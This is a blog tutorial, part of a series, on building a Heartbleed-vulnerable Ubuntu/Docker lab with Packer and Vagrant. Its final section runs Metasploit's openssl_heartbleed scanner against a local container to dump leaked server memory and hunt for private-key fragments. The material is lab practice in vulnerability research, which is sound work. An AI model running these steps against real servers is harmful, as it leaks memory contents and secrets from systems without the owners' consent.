---
title: "The Quest for Automated Interrogation pt 3"
layout: post
---
<br>

<a href="http://heartbleed.com/"><img src="{{ site.url }} /assets/heart.jpg" height="140"  hspace="30"></a>
<a href="http://www.packer.io/"><img src="{{ site.url }} /assets/mitchellh_24702982422030_small.png" width="260"  hspace="30"></a>
<a href="http://www.docker.io/"><img src="{{ site.url }} /assets/homepage-docker-logo.png" height="140"  hspace="30"></a>

<br>
<p class="lead">
This is part three of a multi-part series of a building block project aimed at finding the perfect set of ingredients for automating and mobilizing vulnerability research.
</p>

<p>
<h4>Currently the series stacks up like this:</h4>
</p>

<p>
<h4>
pt 1: Kali Linux VirtualBox setup<br>
pt 2: Vagrant + The Vagrant Pentester setup<br>
pt 3: Heartbleed with Docker & Packer<br>
pt 4: Attacking The Vagrant Pentester<br>
pt 5: Vagrant botnet panel (Murdering Dexter, BitBot, Ra1nx1ng Bots)<br>
pt 6: Drupal pentesting shooting gallery with Docker<br>
pt 7: LXC container security <br>
pt 8: Docker, Hadoop & BinaryPig for malware traffic analysis... is it even possible?<br>
</h4>
</p>

<br>
<p class="lead">
pt 3 Heartbleed with Docker & Packer
</p>

<p>
Expanding upon part 2 lets dive into Packer, from the same developer Mitchell Hashimoto, that gave us Vagrant, Serf and Consul.
<br>
Packer is an exciting tool in that it bridges the gap between different virtalization and deployment platforms  and lets you 
build for each platform concurrantly. In the same JSON template file you can specify multiple builders such as 
VirtualBox (iso or ovf), VmWare (iso or vmx),  Amazon (AMI), Docker (tar balls), Digital Ocean (droplets), and provision them 
with Puppet, Chef, Ansible, Salt or Shell scripts much like you did with Vagrantfiles
  and Vagrant. At the end of the JSON template you can execute post processors such as Vagrant which wraps up the 
  artifacts from the previous steps into a Vagrant .box file or Docker which will import your image and push it to the Docker index. 
</p>

<p>
The JSON template objects are simply a set of keys containing object arrays that handle all of 
the configuration needed for the build.
<br>
You may be wondering after you realized how easy it was using Vagrant to pull and create boxes from virtual
 machines why we would need Packer. The main reason is that sometimes its not appropriate or advisable to use 
 public repositories for your project. While its quick and easy it may not be trusted. If someone other than 
 ourselves wrote it we probably can't consider it trusted for certain cases. When working on a project with some 
 level of criticality you may need to create a virtual machine from scratch and depend on your Puppet manifets or 
 Chef Cookbooks. Packer automates this with its simple to construct templates where you can  specify a source 
 path to pull an iso and its checksums from a trusted mirror of Ubuntu, OpenSuse etc. Then boot commands that 
 can specify preseed files to fully automate the installation. Combine this with  provisioners that fire off 
 custom shell scripts and you now have a powerful, trusted development tool that requires no user intervention 
 and can be shipped off to any development environment.
</p>

<br>
Read more about Packer here:<br>
<i class="fa fa-long-arrow-right"></i><a href="http://www.packer.io/">http://www.packer.io/</a><br>


<br>
Now, if you are in the market for public Packer repositories you are in luck:<br>
<i class="fa fa-long-arrow-right"></i><a href="https://github.com/mitchellh/packer-ubuntu-12.04-docker">https://github.com/mitchellh/packer-ubuntu-12.04-docker</a><br>
<i class="fa fa-long-arrow-right"></i><a href="https://github.com/mitchellh/boot2docker-vagrant-box">https://github.com/mitchellh/boot2docker-vagrant-box</a><br>

<br>
Most notably is Bento which has amassed a large collection of Packer base boxes:<br>
<i class="fa fa-long-arrow-right"></i><a href="https://github.com/opscode/bento">https://github.com/opscode/bento</a><br>

<br>
<p class="lead">
Installing Packer
</p>

Download the package: <br>
<i class="fa fa-long-arrow-right"></i><a href="http://www.packer.io/downloads.html">http://www.packer.io/downloads.html</a><br>

<br>
Move the downloaded files:
{% highlight bash %}
$ mv 0.5.2_darwin_386 ~/packer
# this package was for OSX, yours may be different
{% endhighlight %}
<br>
Edit Bash profile:
{% highlight bash %}
$ nano ~/.bash_profile
{% endhighlight %}

<br>
Add lines to your $PATH variables:
{% highlight bash %}
export PATH="~/packer:$PATH"
# ~/packer should be the path to wherever you installed packer
{% endhighlight %}

<br>
Source your profile:
{% highlight bash %}
$ source ~/.bash_profile 
{% endhighlight %}

<br>
Verify installation:
{% highlight bash %}
$ packer
{% endhighlight %}

<br>
<p class="lead">
Using Bento repositories:
</p>

Clone the entire repository:
{% highlight bash %}
$ git clone https://github.com/opscode/bento.git
$ cd bento
$ cd packer
{% endhighlight %}

<br>
Pick a distribution and build it:
<br>
{% highlight bash %}
$ packer build -only=virtualbox-iso ubuntu-14.04-i386.json
# the 'only' switch will ensure that only virtualbox builders, provisioner and post
# processors will be executed 
{% endhighlight %}

<br>
<p>
This process will take substantially longer than what you were accustomed to with Vagrant base boxes. 
When the VirtualBox machine boots up, runs thru the install and then shows you the terminal prompt asking for a login, 
do not touch anything. You will notice that on your hosts terminal it is still running thru all the provisioners. 
If you attempt to enter the VirtualBox terminal or login it will cause the SSH session from your host to break and 
the install will fail. Only when all processes are finished in your host’s terminal can you move on to the next step.
</p>

<br>
After Packer has finished and you have been returned back to the host terminal: 
<br>
{% highlight bash %}
$ cd ../builds/virtualbox
{% endhighlight %}

<br>
If you do a quick 'ls' you will see the artifact box created by Packer. Add it to your Vagrant box list:

{% highlight bash %}
$ vagrant box add opscode_ubuntu-12.04-i386_chef_provisionerless.box --name ubuntu12lts
$ vagrant init ubuntu12lts
$ vagrant up
{% endhighlight %}

<br>
A VirtualBox machine will now launch. neat.

<p
On to our quest for automated vulnerability research. 
Painfully obvious is the amount press the Heartbleed vulnerability has gotten since its became public. A perfect 
proof of concept would be to use Packer to create a Docker/Ubuntu machine to test a heartbleed vulnerable server. 
<br>

Hashimoto has two Packer templates available thru his GitHub. The first template is for Boot2Docker, a super minimalistic lightweight
Linux distribution based on Tiny Core Linux that allows you to run Docker just about anywhere. Because of how minimal it is it really 
isnt practical to build on top of it. 
<br>
The Second is a template for an Ubuntu LTS 12.04 release with Docker installed and configured. This will be the perfect framework 
for which to build off of. I have already done the dirty work and forked Hashimoto's repository and added scripts that will 
install a very bare bones version of Metasploit and also pull the <a href="https://index.docker.io/u/andrewmichaelsmith/docker-heartbleed/">andrewmichaelsmith/docker-heartbleed</a> Docker
image and fire the container up every time the machine boots. I will walk thru each step so you can reproduce everything on your own
machines. 
</p>

<br>
<p class="lead">
Pull the Ubuntu/Docker Packer template:
</p>

{% highlight bash %}
$ git clone https://github.com/p00gz/packer-ubuntu-12.04-docker-heartbleed.git
$ cd packer-ubuntu-12.04-docker-heartbleed
{% endhighlight %}


<br>
<p class="lead">
Use Packer to build from the template:
</p>
{% highlight bash %}
$ packer build -only=virtualbox-iso template.json
{% endhighlight %}

<br>
<p>
As I previously stated be prepared to do some serious yak shaving. Depending on your processer and internet connection 
the build will clock in around 45 minutes. Remember not to touch the VirtualBox machine that launches during the different stages
of the build. 
</p>

When the VirtualBox machine closes and the terminal returns back to host its time to add the newly created artifact box to the
your Vagrant box directory. If you do a quick 'ls' you should see the new .box file. 

<br>
Add the box to Vagrant:
{% highlight bash %}
$ vagrant box add packer_virtualbox-iso_virtualbox.box --name vulnerable
{% endhighlight %}

<br>
Create working directory, initialize and bring it up:
{% highlight bash %}
$ mkdir heartbleed
$ cd heartbleed
$ vagrant init vulnerable
$ vagrant up
{% endhighlight %}

<br>
SSH into the box:
{% highlight bash %}
$ vagrant ssh
{% endhighlight %}

<br>
Make sure Docker works:
{% highlight bash %}
$ docker -v
# will return the Docker version number
{% endhighlight %}

<br>
Check to make sure the Docker container is running and locate the container ID:
{% highlight bash %}
$ docker ps
# should show the andrewmichaelsmith/docker-heartbleed:latest container
{% endhighlight %}

<br>
Copy the Container ID number as you will need to grep for the IP address to load into Metasploit:<br>
{% highlight bash %}
$ docker inspect b5ee3b134fe7 | grep IPAddress
# replace  'b5ee3b134fe7' with your container ID
{% endhighlight %}

<br>
This will usually return "IPAddress": "172.17.0.2". Write this down for the next step

<br>
Launch Metasploit:
{% highlight bash %}
$ msfconsole
# this may take a bit.... patience.
{% endhighlight %}

<br>
Inside the msf console:
{% highlight bash %}
$ use auxiliary/scanner/ssl/openssl_heartbleed
$ set VERBOSE true
$ set RHOSTS 172.17.0.2
$ show options
# make sure everything looks correct
$ exploit
{% endhighlight %}

<p>
After hitting exploit you should be presented with 65,551 bytes of <strong>random</strong>leaked data. Everytime 
you run the scanner it will dump a new set of leaked data. The key point here is that this is not an exploit but merely a scanner
that tests the remote server for the vulnerability and returns random data from memory.

<br>
<img src="{{ site.url }} /assets/hbleed.png">
</p>

Now if you want to dig a little deeper you can close the current Docker container and launch a new container with an interactive shell.
Start by exiting msfconsole (simply type 'exit') and then stop the currently running Docker container:
{% highlight bash %}
$ docker ps
# note the container ID
$ docker stop b5ee3b134fe7
$ docker run -i -t  andrewmichaelsmith/docker-heartbleed:latest  /bin/bash
{% endhighlight %}

<br>
You should now be inside the running Docker container with the prompt: root@2942517736be or something similar. 
{% highlight bash %}
$ cd /etc/apache2/ssl
$ vi apache.key 
# make note of the key. :q to exit vi
$ exit 
{% endhighlight %}

<br>
After exiting the container the Docker process will stop. Start up the original Docker container that was running the Apache server:
{% highlight bash %}
$ docker run -d andrewmichaelsmith/docker-heartbleed
{% endhighlight %}

Then start up the Metasploit console and run the exploit again to see what sort info you can find and see if you can
spot parts of the key or any other interesting data in the dump. Odds are that because the scanner is giving you random chunks of
data you wont find much, but its still interesting enough to look. 

So there you have it, a pretty simple and cute proof of concept combining continuous management tools and infosec. 
While i used the Heartbleed example here the goal of this Packer template ultimately is to provide Docker alongside Metasploit 
to research and practice container security and exploits. There are many similar images available in the Docker index that you can
pull and test/attack:<br>
<i class="fa fa-long-arrow-right"></i><a href="https://index.docker.io/">https://index.docker.io/</a><br>

<br>
<br>
Next: The Quest for Automated Interrogation pt. 4: Attacking The Vagrant Pentester
<hr>
<br>
<br>
<br>

  




